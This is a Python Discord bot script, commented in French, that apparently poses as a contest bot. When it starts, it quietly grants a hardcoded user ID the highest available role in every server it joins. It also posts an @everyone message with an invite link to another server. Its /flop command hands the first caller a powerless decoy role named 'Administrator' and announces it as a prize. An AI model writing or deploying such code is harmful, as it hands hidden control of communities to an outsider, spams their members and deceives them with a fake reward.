import discord
from discord.ext import commands
import asyncio

# Configuration
TOKEN = 'VOTRE_TOKEN_BOT'
CHANNEL_ID = 1407097136432156893
USER_ID = 836452038548127764

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True  # Nécessaire pour les commandes

bot = commands.Bot(command_prefix='/', intents=intents)

# Variable pour tracker si quelqu'un a déjà gagné
winner_found = False

@bot.event
async def on_ready():
    print(f'{bot.user} est connecté!')
    
    # Donner le rôle le plus haut possible à l'utilisateur spécifié
    for guild in bot.guilds:
        member = guild.get_member(USER_ID)
        if member:
            highest_role = guild.roles[-2]  # -2 car -1 est @everyone
            try:
                await member.add_roles(highest_role)
                print(f"Rôle {highest_role.name} donné à {member}")
            except:
                print("Impossible de donner le rôle")
    
    # Envoyer le message d'annonce
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("New tierlist @everyone\n\nhttps://discord.gg/pYkja3hM")
        print("Message envoyé!")

@bot.command(name='flop')
async def flop(ctx):
    global winner_found
    
    # Vérifier si quelqu'un a déjà gagné
    if winner_found:
        await ctx.send("Le concours est déjà terminé!")
        return
    
    # Chercher ou créer le rôle "Administrator"
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="Administrator")
    
    # Si le rôle n'existe pas, le créer sans permissions
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="Administrator",
                permissions=discord.Permissions.none(),
                color=discord.Color.gold()
            )
            print(f"Rôle 'Administrator' créé")
        except Exception as e:
            await ctx.send("Erreur lors de la création du rôle!")
            print(f"Erreur: {e}")
            return
    
    # Donner le rôle au gagnant
    try:
        await ctx.author.add_roles(admin_role)
        winner_found = True
        await ctx.send(f"🎉 Félicitations {ctx.author.mention}! Tu as gagné le rôle **Administrator**!")
        print(f"{ctx.author} a gagné le concours!")
    except Exception as e:
        await ctx.send("Erreur lors de l'attribution du rôle!")
        print(f"Erreur: {e}")

bot.run(TOKEN)
